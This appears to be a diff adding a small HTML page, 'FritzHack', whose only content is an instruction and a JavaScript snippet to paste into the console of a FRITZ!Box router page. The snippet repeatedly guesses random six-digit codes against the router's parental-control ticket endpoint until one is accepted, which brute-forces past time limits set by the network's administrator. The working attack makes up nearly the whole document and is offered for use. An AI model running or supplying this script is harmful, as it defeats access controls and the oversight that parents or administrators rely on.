@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FHack</title>
+    <style>
+        #code{
+            margin:1vw;
+            padding:1vw;
+            border: solid black 1pt;
+        }
+        body{
+            padding:1vw;
+            color:#eee;
+            background-color:#333;
+            font-family: sans-serif;
+        }
+
+    </style>
+  </head>
+  <body>
+    <h1>FritzHack</h1>
+    copy and paste this into the console of the fritz box page:
+    <p id="code">
+      document.head.innerHTML='&lt;meta http-equiv=&quot;content-type&quot;
+      content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;meta
+      name=&quot;FritzHack&quot; content=&quot;&quot;&gt;
+      &lt;title&gt;FritzHack&lt;/title&gt; &lt;style&gt;#gridC{display:grid;
+      grid-template-columns: auto auto auto auto;}.grid-itm{border:solid black
+      1pt; width:20vw; height:
+      20vh;}&lt;/style&gt;',document.body.innerHTML='&lt;button
+      onclick=&quot;loop()&quot;&gt;Hack&lt;/button&gt;&lt;button
+      onclick=&quot;running=false&quot;&gt;Stop&lt;/button&gt; &lt;div
+      id=&quot;gridC&quot;&gt; &lt;/div&gt;';var
+      running=!0,elConsole=document.createElement(&quot;div&quot;),elGridC=document.getElementById(&quot;gridC&quot;);function
+      log(e){console.log(e);var t=document.createElement(&quot;div&quot;);return
+      t.innerHTML=e,elConsole.appendChild(t),t}function
+      addGridItm(e){console.log(e);var
+      t=document.createElement(&quot;div&quot;);return
+      t.innerHTML=e,elGridC.appendChild(t),t}function
+      initHack(){document.body.appendChild(elConsole),elConsole.innerHTML=&quot;FritzHack
+      v1.0 - SNAPSHOT console &lt;hr/&gt;&quot;,log(&quot;HACK
+      WORLD&quot;)}function loop(e){if(running){var
+      t=generateCode();log(&quot;Checking code:&quot;+t+&quot;...&quot;);var
+      n=new
+      XMLHttpRequest;n.onreadystatechange=function(){if(4==this.readyState&amp;&amp;200==this.status){var
+      e=this.responseText;e.includes(&quot;Einl&ouml;sen des Tickets
+      fehlgeschlagen.&quot;)||(addGridItm(e),running=!1),log(&quot;invalid
+      code,trying again
+      !&quot;),requestAnimationFrame(loop)}}}n.open(&quot;POST&quot;,&quot;http://fritz.box/tools/kids_not_allowed.lua&quot;,!0),n.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;),n.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;),n.setRequestHeader(&quot;Cache-Control&quot;,&quot;max-age=0&quot;),n.setRequestHeader(&quot;Upgrade-Insecure-Requests&quot;,&quot;1&quot;),n.send(&quot;account=landeviceUID-8247&amp;ticket=&quot;+t+&quot;&amp;edit=&quot;)}function
+      generateCode(){var e=&quot;&quot;;for(var
+      t=0;t&lt;6;t++)e+=&quot;1234567890&quot;.charAt(Math.floor(Math.random()*&quot;1234567890&quot;.length));return
+      e}function
+      eventFire(e,t){if(e.fireEvent)e.fireEvent(&quot;on&quot;+type);else{var
+      n=document.createEvent(&quot;Events&quot;);n.initEvent(t,!0,!1),e.dispatchEvent(n)}}window.onload=initHack,initHack();
+    </p>
+  </body>
+</html>
